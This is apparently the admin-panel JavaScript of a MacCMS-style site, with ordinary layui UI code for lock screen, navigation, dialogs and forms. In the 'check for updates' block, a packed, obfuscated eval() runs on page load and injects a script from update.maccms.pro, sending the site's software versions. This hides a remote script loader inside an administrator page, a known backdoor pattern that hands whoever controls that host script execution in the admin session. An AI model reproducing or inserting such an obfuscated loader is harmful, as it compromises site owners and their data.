String.prototype.trim=function(){
    return this.replace(/(^[\s\u3000]*)|([\s\u3000]*$)/g, "");
}
String.prototype.ltrim=function(){
    return this.replace(/(^\s*)/g, "");
}
String.prototype.rtrim=function(){
    return this.replace(/(\s*$)/g, "");
}
String.prototype.replaceAll  = function(s1,s2){
    return this.replace(new RegExp(s1,"gm"),s2);
}

layui.define(['element', 'form'], function(exports) {
    var $ = layui.jquery,element = layui.element, layer = layui.layer, form = layui.form;

    form.render();

    var lockscreen = function() {
        document.oncontextmenu=new Function("event.returnValue=false;");
        document.onselectstart=new Function("event.returnValue=false;");
        layer.open({
            title: false,
            type: 1,
            content: '<div class="lock-screen"><input type="password" class="unlockedPwd layui-input" placeholder="'+localStorage.getItem("tip17")+'" autocomplete="off"><button class="unlocked layui-btn">'+localStorage.getItem("tip18")+'</button><div class="unlockTips"></div></div>',
            closeBtn: 0,
            shade: 0.95,
            offset: '350px'
        });
    };
    /* 锁屏 */
    $('#lockScreen').click(function () {
        window.sessionStorage.setItem("lockscreen", true);
        lockscreen();
    });
    /* 清理缓存 */
    $('#lockScreen').click(function () {
        window.sessionStorage.setItem("lockscreen", true);
        lockscreen();
    });

    if(window.sessionStorage.getItem("lockscreen") == "true"){
        lockscreen();
    }

    $(document).on('click', '.unlocked', function() {
        var pwd = $(this).parent().find('.unlockedPwd').val();
        if (pwd == '') {
            return false;
        }
        $.post(ADMIN_PATH + '/admin/index/unlocked', {password:pwd}, function(res) {
            if (res.code == 1) {
                window.sessionStorage.setItem("lockscreen", false);
                layer.closeAll();
            } else {
                $('.unlockTips').html(res.msg);
                setTimeout(function(){
                    $('.unlockTips').html('');
                }, 3000);
            }
        });
    });

    /* 导航高亮标记 */
    $('.admin-nav-item').click(function() {
        window.localStorage.setItem("adminNavTag", $(this).attr('href'));
    });
    if (window.localStorage.getItem("adminNavTag")) {
        $('#switchNav a[href="'+window.localStorage.getItem("adminNavTag")+'"]').parent('dd').addClass('layui-this').parents('li').addClass('layui-nav-itemed').siblings('li').removeClass('layui-nav-itemed');
    }
    if (typeof(LAYUI_OFFSET) == 'undefined') {
        layer.config({offset:'60px'});
    } else {
        layer.config({offset:LAYUI_OFFSET+'px'});
    }
    /* 打开/关闭左侧导航 */
    $('#foldSwitch').click(function(){
        var that = $(this);
        if (!that.hasClass('close')) {
            that.addClass('close');
            $('#switchNav').animate({width:'52px'}, 100).addClass('close').hover(function() {
                if (that.hasClass('close')) {
                    $(this).animate({width:'200px'}, 300);
                    $('#switchNav .fold-mark').removeClass('fold-mark');
                    $('a[href="'+window.localStorage.getItem("adminNavTag")+'"]').parent('dd').addClass('layui-this').parents('li').addClass('layui-nav-itemed').siblings('li').removeClass('layui-nav-itemed');
                }
            },function() {
                if (that.hasClass('close')) {
                    $(this).animate({width:'52px'}, 300);
                    $('#switchNav .layui-nav-item').addClass('fold-mark').removeClass('layui-nav-itemed');
                }
            });
            $('#switchBody,.footer').animate({left:'52px'}, 100);
            $('#switchNav .layui-nav-item').addClass('fold-mark').removeClass('layui-nav-itemed');
        } else {
            $('a[href="'+window.localStorage.getItem("adminNavTag")+'"]').parent('dd').addClass('layui-this').parents('li').addClass('layui-nav-itemed').siblings('li').removeClass('layui-nav-itemed');
            that.removeClass('close');
            $('#switchNav').animate({width:'200px'}, 100).removeClass('close');
            $('#switchBody,.footer').animate({left:'200px'}, 100);
            $('#switchNav .fold-mark').removeClass('fold-mark');
        }
    });

    /* 导航菜单切换 */
    $('.main-nav a').click(function () {
        var that = $(this), i = $(this).attr('data-i');
        $('.layui-nav-tree').hide().eq(i-1).show();
    });

    /* 操作提示 */
    $('.help-tips').click(function(){
        layer.tips($(this).attr('data-title'), this, {
            tips: [3, '#009688'],
            time: 5000
        });
        return false;
    });

    /* 全屏控制 */
    $('#fullscreen-btn').click(function(){
        var that = $(this);
        if (!that.hasClass('ai-quanping')) {
            $('#switchBody').css({'z-index':1000});
            $('#switchNav').css({'z-index':900});
            that.addClass('ai-quanping').removeClass('ai-quanping1').parents('.page-body').addClass('fullscreen');
            $('.page-tab-content').css({'min-height':($(window).height()-63)+'px'});
        } else {
            $('#switchBody').css({'z-index':998});
            $('#switchNav').css({'z-index':1000});
            that.addClass('ai-quanping1').removeClass('ai-quanping').parents('.page-body').removeClass('fullscreen');
            $('.page-tab-content').css({'min-height':'auto'});
        }
    });

    /*弹出选择设置*/
    $(document).on('click', '.j-select', function() {
        var that = $(this);
        _url = that.attr('data-href'),
            _title = that.attr('data-title'),
            _width = that.attr('data-width') ? that.attr('data-width')+'' : 750,
            _height = that.attr('data-height') ? that.attr('data-height')+'' : 500,
            _full = that.attr('data-full'),
            _checkbox = that.attr('data-checkbox');

        if (that.parents('form')[0]) {
            var query = that.parents('form').serialize();
        } else {
            var query = $('#pageListForm').serialize();
        }
        if(_checkbox && !query){
            return;
        }
        $.post(_url, query, function(res) {
            layer.closeAll('dialog');
            var lay = layer.open({type:1, title:_title||localStorage.getItem("tip19"), content:res.msg||res, area: [_width+'px', _height+'px']});
            form.render('select');
        });
    });

    /*iframe弹窗*/
    $(document).on('click', '.j-iframe', function() {
        var that = $(this),
            _url = that.attr('data-href'),
            _title = that.attr('data-title'),
            _width = that.attr('data-width') ? that.attr('data-width')+'' : '85%',
            _height = that.attr('data-height') ? that.attr('data-height')+'' : '80%',
            _full = that.attr('data-full'),
            _checkbox = that.attr('data-checkbox');


        if (!_url) {
            layer.msg(localStorage.getItem("tip10"));
            return false;
        }
        
        if(_checkbox){
            if ($('.checkbox-ids:checked').length <= 0) {
                layer.msg(localStorage.getItem("tip11"));
                return false;
            }

            var ids = [];
            $('.checkbox-ids:checked').each(function(index, item) {
                if(item.checked){
                    ids.push(item.value);
                }
            });
            _ids = ids.join(',');
            _url = _url.indexOf('?') > -1 ? _url + '&ids='+_ids : _url + '?ids=' + _ids;
        }
        var lay = layer.open({type:2, title:_title||localStorage.getItem("tip19"), content:_url, area: [_width+'', _height+'']});
        if(_full=='1'){
            layer.full(lay);
        }
        return false;
    });

    // 检查更新
    $(function(){
        if( typeof(MAC_VERSION) !='undefined' && typeof(PHP_VERSION) !='undefined' && typeof(THINK_VERSION) !='undefined' ) {
            eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(\'1\').2(\'<3 4="//5.6.0/0/?c=7&8=\'+9+\'&a=\'+b+\'&d=\'+e+\'&f=\'+g+\'&h=\'+i.j()+\'"></k\'+\'l>\');',22,22,'pro|body|append|script|src|update|maccms|check|v|MAC_VERSION|p|PHP_VERSION||tp|THINK_VERSION|lang|MAC_LANG|t|Math|random|scr|ipt'.split('|'),0,{}));
        }
    });

    /* 全选 */
    form.on('checkbox(allChoose)', function(data) {
        var child = $(data.elem).parents('table').find('tbody input.checkbox-ids');
        child.each(function(index, item) {
            item.checked = data.elem.checked;
        });
        form.render('checkbox');
    });

    /* 监听状态设置开关 */
    form.on('switch(switchStatus)', function(data) {
        var that = $(this), status = 0;
        if (!that.attr('data-href')) {
            layer.msg(localStorage.getItem("tip12"));
            return false;
        }
        if (this.checked) {
            status = 1;
        }
        $.get(that.attr('data-href'), {val:status}, function(res) {
            layer.msg(res.msg);
            if (res.code == 0) {
                that.trigger('click');
                form.render('checkbox');
            }
        });
    });

    /* 监听表单提交 */
    form.on('submit(formSubmit)', function(data) {
        var that = $(this),
            _form = '';
            _child = !that.attr('data-child') ? 'no' : that.attr('data-child'),
            refresh = !that.attr('refresh') ? 'yes' : that.attr('refresh');

        if ($(this).attr('data-form')) {
            _form = $($(this).attr('data-form'));
        } else {
            _form = $(this).parents('form');
        }
        // CKEditor专用
        if (typeof(CKEDITOR) != 'undefined') {
            for (instance in CKEDITOR.instances) {
                CKEDITOR.instances[instance].updateElement();
            }
        }
        layer.msg(localStorage.getItem("tip13"),{time:500000});
        $.ajax({
            type: "POST",
            url: _form.attr('action'),
            data: _form.serialize(),
            success: function(res) {
                layer.msg(res.msg, {time:800},function() {
                    if (res.code == 1) {

                        if(refresh=='yes') {
                            if (_child == 'true') {
                                parent.location.reload();
                                parent.layer.close(index);
                            }
                            else {
                                if (typeof(res.url) != 'undefined' && res.url != null && res.url != '') {
                                    location.href = res.url;
                                } else {
                                    location.reload();
                                }
                            }
                        }
                        else{
                            var index = parent.layer.getFrameIndex(window.name);
                            layer.closeAll();
                            onSubmitResult(res);
                        }
                    }
                    else{
                    }
                });
            }
        });
        return false;
    });

    /* TR数据行删除 */
    $('.j-tr-del').click(function() {
        var that = $(this),
            href = !that.attr('data-href') ? that.attr('href') : that.attr('data-href');
        layer.confirm(localStorage.getItem("tip14"), {title:localStorage.getItem("tip19"), btn:[localStorage.getItem("tip20"),localStorage.getItem("tip21")]}, function(index){
            if (!href) {
                layer.msg(localStorage.getItem("tip12"));
                return false;
            }
            $.get(href, function(res){
                layer.msg(res.msg);
                if (res.code == 1) {
                    that.parents('tr').remove();
                    that.parents('.tr').remove();
                }
            });
            layer.close(index);
        });
        return false;
    });

    /* ajax请求操作 */
    $(document).on('click', '.j-ajax', function() {
        var that = $(this),
            href = !that.attr('data-href') ? that.attr('href') : that.attr('data-href'),
            refresh = !that.attr('refresh') ? 'yes' : that.attr('refresh');
        if (!href) {
            layer.msg(localStorage.getItem("tip12"));
            return false;
        }

        if (!that.attr('confirm')) {
            layer.msg(localStorage.getItem("tip13"), {time:500000});
            $.get(href, {}, function(res) {
                layer.msg(res.msg, {}, function() {
                    if (refresh == 'yes') {
                        if (typeof(res.url) != 'undefined' && res.url != null && res.url != '') {
                            location.href = res.url;
                        } else {
                            location.reload();
                        }
                    }
                });
            });
            layer.close();
        }
        else {
            layer.confirm(that.attr('confirm'), {title:localStorage.getItem("tip19"), btn:[localStorage.getItem("tip20"),localStorage.getItem("tip21")]}, function(index){
                layer.msg(localStorage.getItem("tip13"), {time:500000});
                $.get(href, {}, function(res) {
                    layer.msg(res.msg, {}, function() {
                        if (refresh == 'yes') {
                            if (typeof(res.url) != 'undefined' && res.url != null && res.url != '') {
                                location.href = res.url;
                            } else {
                                location.reload();
                            }
                        }
                    });
                });
                layer.close(index);
            });
        }
        return false;
    });

    /* 数据列表input编辑自动选中ids */
    $('.j-auto-checked').blur(function(){
        var that = $(this);
        if(that.attr('data-value') != that.val()) {
            that.parents('tr').find('input[name="ids[]"]').attr("checked", true);
        }else{
            that.parents('tr').find('input[name="ids[]"]').attr("checked", false);
        };
        form.render('checkbox');
    });

    /* 用ajax方式更新input*/
    $('.j-ajax-input').focusout(function(){
        var that = $(this), _val = that.val();
        if (_val == '') return false;
        if (that.attr('data-value') == _val) return false;
        if (!that.attr('data-href')) {
            layer.msg(localStorage.getItem("tip12"));
            return false;
        }
        $.post(that.attr('data-href'), {val:_val}, function(res) {
            if (res.code == 1) {
                that.attr('data-value', _val);
            }
            layer.msg(res.msg);
        });
    });

    /* 小提示 */
    $('.tooltip').hover(function() {
        var that = $(this);
        that.find('i').show();
    }, function() {
        var that = $(this);
        that.find('i').hide();
    });

    $('.j-search').click(function(){
        var that = $(this);
        that.parents('form').attr('method','get');
        that.parents('form').submit();
    });

    /* 列表按钮组 */
    $('.j-page-btns').click(function(){
        var that = $(this),
            code = function(that) {
                var href = that.attr('href') ? that.attr('href') : that.attr('data-href'),
                _checkbox = !that.attr('data-checkbox') ? 'yes' : that.attr('data-checkbox'),
                _ajax = !that.attr('data-ajax') ? 'yes' : that.attr('data-ajax'),
                _ids = '';
                if (!href) {
                    layer.msg(localStorage.getItem("tip12"));
                    return false;
                }

                if(_checkbox=='yes') {
                    if ($('.checkbox-ids:checked').length <= 0) {
                        layer.msg(localStorage.getItem("tip11"));
                        return false;
                    }
                    var ids = [];
                    $('.checkbox-ids:checked').each(function(index, item) {
                        if(item.checked){
                            ids.push(item.value);
                        }
                    });
                    _ids = ids.join(',');
                }
                if(_ajax=='yes') {
                    if (that.parents('form')[0]) {
                        var query = that.parents('form').serialize();
                    } else {
                        var query = $('#pageListForm').serialize();
                    }
                    layer.msg(localStorage.getItem("tip13"), {time: 500000});
                    $.post(href, query, function (res) {
                        layer.msg(res.msg, {}, function () {
                            if (res.code != 0) {
                                location.reload();
                            }
                        });
                    });
                }
                else{
                    location.href= href.indexOf('?') ==-1 ? href+'?ids='+ _ids : href+'&ids='+_ids;
                }
            };
        if (that.hasClass('confirm')) {
            var tips = that.attr('tips') ? that.attr('tips') : localStorage.getItem("tip15");
            layer.confirm(tips, {title:localStorage.getItem("tip19"), btn:[localStorage.getItem("tip20"),localStorage.getItem("tip21")]}, function(index){
                code(that);
                layer.close(index);
            });
        } else {
            code(that);
        }
        return false;
    });


    exports('global', {});
});

function onSelectResult(input,obj){
    var ids = [];
    var s1 ='',s2='';
    $(obj).each(function(index, item) {
        if(item.checked){
            s1 = $("input[name='"+input+"']").val();
            s2 = ','+s1+',';
            if(s2.indexOf(','+item.value+',') ==-1){
                if(s1.length > 0 && s1.substring(s1.length-1)!=','){
                    s1 += ',';
                }
                s1 += item.value;
                $("input[name='"+input+"']").val( s1 );
            }
        }
    });
    alert(localStorage.getItem("tip16"));
}

function rndNum(under, over){
    switch(arguments.length){
        case 1: return parseInt(Math.random()*under+1);
        case 2: return parseInt(Math.random()*(over-under+1) + under);
        default: return 0;
    }
}

function changeParam(url,name,value)
{
    var newUrl="";
    var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
    var tmp = name + "=" + value;
    if(url.match(reg) != null) {
        newUrl= url.replace(eval(reg),'&'+tmp + '&');
    }
    else {
        if(url.match("[\?]")) {
            newUrl= url + "&" + tmp;
        }
        else{
            newUrl= url + "?" + tmp;
        }
    }
    return newUrl;
}

function getDataTime(ts,ty) {
    if(ts<1){
        return '';
    }
    var t,y,m,d,h,i,s;
    t = ts ? new Date(ts*1000) : new Date();
    y = t.getFullYear();
    m = t.getMonth()+1;
    d = t.getDate();
    h = t.getHours();
    i = t.getMinutes();
    s = t.getSeconds();
    r = y+'-'+(m<10?'0'+m:m) + '-' + (d<10?'0'+d:d);

    if(ty==undefined || ty==''){
        r += ' ' + (h<10?'0'+h:h)  + ':' + (i<10?'0'+i:i) + ':' + (s<10?'0'+s:s)
    }
    return r;
}

function mac_url_img(url)
{
    url = url.replace('mac:','http:');
    if (url.indexOf("http") == -1 || url.indexOf("//") == -1){
        url = ROOT_PATH+"/"+url;
    }
    else if(UPLOAD_IMG_KEY !='' && UPLOAD_IMG_API !=''){
        var reg=eval("/" + UPLOAD_IMG_KEY + "/i");
        if(reg.test(url)!=false){
            url = UPLOAD_IMG_API + url;
        }
    }
    return url;
}


// 对象转数组
function obj2Arr(obj) {
    var arr = [];
    for(var num in obj){
        if(num&&obj[num]){
            arr[num-1] = obj[num];
        }
    }
    return arr;
}
// 将原始菜单数据，转换成符合pear-admin的格式
function originDataParse2PearAdminMenu(arr){
    var newArr = [];
    // var iconMap = {
    //     '首页':'layui-icon-home',
    //     '系统':'layui-icon-engine',
    //     '基础':'layui-icon-set',
    //     '视频':'layui-icon-video',
    //     '文章':'layui-icon-file',
    //     '用户':'layui-icon-user',
    //     '模版':'layui-icon-template',
    //     '生成':'layui-icon-component',
    //     '采集':'layui-icon-edit',
    //     '数据库':'layui-icon-code-circle',
    //     '应用':'layui-icon-cellphone-fine',
    //     '网址':'layui-icon-website',
    //     '其他':'layui-icon-note',
    // }   
    arr.forEach((item,index)=>{
        var obj = {};
        obj.id = item.icon+encodeURIComponent(item.name);
        obj.title = item.name;
        obj.icon = `layui-icon ${item.icon}`;
        obj.type = 0;
        obj.href = "";
        obj.children = [];
        for(var key in item.sub){
            // if(item.sub[key].url==="###"){
            //     continue;
            // }
            var innerObj = {};
            innerObj.id = key;
            innerObj.title = item.sub[key].name;
            innerObj.icon = "layui-icon layui-icon-console";
            innerObj.type = 1;
            innerObj.openType = "_iframe";
            innerObj.href = item.sub[key].url;
            obj.children.push(innerObj);
        }
        newArr.push(obj);
    });
    return newArr;
}